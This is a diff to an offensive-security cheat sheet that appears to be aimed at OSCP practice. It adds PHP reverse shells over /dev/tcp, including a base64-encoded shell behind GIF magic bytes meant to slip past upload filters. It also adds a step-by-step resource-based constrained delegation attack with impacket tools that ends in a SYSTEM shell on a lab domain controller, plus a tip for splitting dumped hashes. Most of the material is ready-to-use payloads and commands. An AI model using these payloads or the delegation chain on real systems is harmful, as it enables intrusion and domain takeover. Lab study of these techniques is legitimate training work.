@@ -194,6 +194,15 @@
 <li><a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/tree/master">Report Maker</a></li>
 </ul>
 <h3 id="random-things"><a class="header" href="#random-things">Random things</a></h3>
+<h2 id="saving-things-into-files-quickly"><a class="header" href="#saving-things-into-files-quickly">Saving things into files quickly</a></h2>
+<pre><code>For example, if you have a username/hash dump, save into a file:
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+
+cat secrets | cut -d ":" -f 1 | tee users
+cat secrets | cut -d ":" -f 4 | tee passwords
+
+</code></pre>
 <h2 id="variables"><a class="header" href="#variables">Variables</a></h2>
 <pre><code>export IP=""
 
@@ -1956,8 +1965,29 @@ cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &
 system('nc.exe -e cmd.exe 10.10.10.5 4444')
 
 ?&gt;
+
+or
+
+
+&lt;?php
+exec("/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.45.204/4444 0&gt;&amp;1'");
+
+
 </code></pre>
 <pre><code>&lt;?php system($_REQUEST["cmd"]); ?&gt;
+</code></pre>
+<pre><code class="language-php">
+You could also encode this:
+
+    echo "sh -i &gt;&amp; /dev/tcp/192.168.1.75/8081 0&gt;&amp;1" | base64 -w 0
+
+
+Then do this with GIF Magic Bytes
+
+     GIF89a;
+    &lt;?php
+      system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjc1LzgwODEgMD4mMQo= | base64 -d | bash");
+    ?&gt;
 </code></pre>
 <h4 id="aspx"><a class="header" href="#aspx">ASP/x</a></h4>
 <h5 id="reverse-shell-3"><a class="header" href="#reverse-shell-3">Reverse shell</a></h5>
@@ -8833,6 +8863,92 @@ usemodule credentials/mimikatz/dcsync_hashdump
 usemodule credentials/mimikatz/dcsync
 
 </code></pre>
+<h3 id="resource-based-constrained-delegation"><a class="header" href="#resource-based-constrained-delegation">Resource Based Constrained Delegation</a></h3>
+<p>Let's use our access with the <code>l.livingstone</code> account to create a new machine account on the domain. We can do with by using <code>impacket-addcomputer</code>.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
+</code></pre>
+<p>We can verify that this machine account was added to the domain by using our <code>evil-winrm</code> session from before.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack
+
+
+DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
+DNSHostName       :
+Enabled           : True
+Name              : ATTACK
+ObjectClass       : computer
+ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9
+SamAccountName    : ATTACK$
+SID               : S-1-5-21-537427935-490066102-1511301751-3601
+UserPrincipalName :
+</code></pre>
+<p>With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of <a href="https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</a> and use it to set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on our new machine account.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  
+...
+┌──(kali㉿kali)-[~]
+└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
+[*] Initializing LDAP connection to 192.168.120.181
+[*] Using resourced\l.livingstone account with password ***
+[*] LDAP bind OK
+[*] Initializing domainDumper()
+[*] Initializing LDAPAttack()
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
+[*] Delegation rights modified succesfully!
+[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
+</code></pre>
+<p>We can confirm that this was successful by using our <code>evil-winrm</code> session.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
+
+Path Owner                  Access
+---- -----                  ------
+     BUILTIN\Administrators resourced\ATTACK$ Allow
+</code></pre>
+<p>We now need to get the administrator service ticket. We can do this by using <code>impacket-getST</code> with our privileged machine account.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+</code></pre>
+<p>This saved the ticket on our Kali host as <strong>Administrator.ccache</strong>. We need to export a new environment variable named <code>KRB5CCNAME</code> with the location of this file.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=./Administrator.ccache
+</code></pre>
+<p>Now, all we have to do is add a new entry in <strong>/etc/hosts</strong> to point <code>resourcedc.resourced.local</code> to the target IP address and run <code>impacket-psexec</code> to drop us into a system shell.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" &gt;&gt; /etc/hosts'
+
+┌──(kali㉿kali)-[~]
+└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on resourcedc.resourced.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file zZeQFeGQ.exe
+[*] Opening SVCManager on resourcedc.resourced.local.....
+[*] Creating service rEwK on resourcedc.resourced.local.....
+[*] Starting service rEwK.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2145]
+(c) 2018 Microsoft Corporation. All rights reserved.
+ 
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt; 
+</code></pre>
+<p>Success! We now have system access on the target system.</p>
 
                     </main>
 
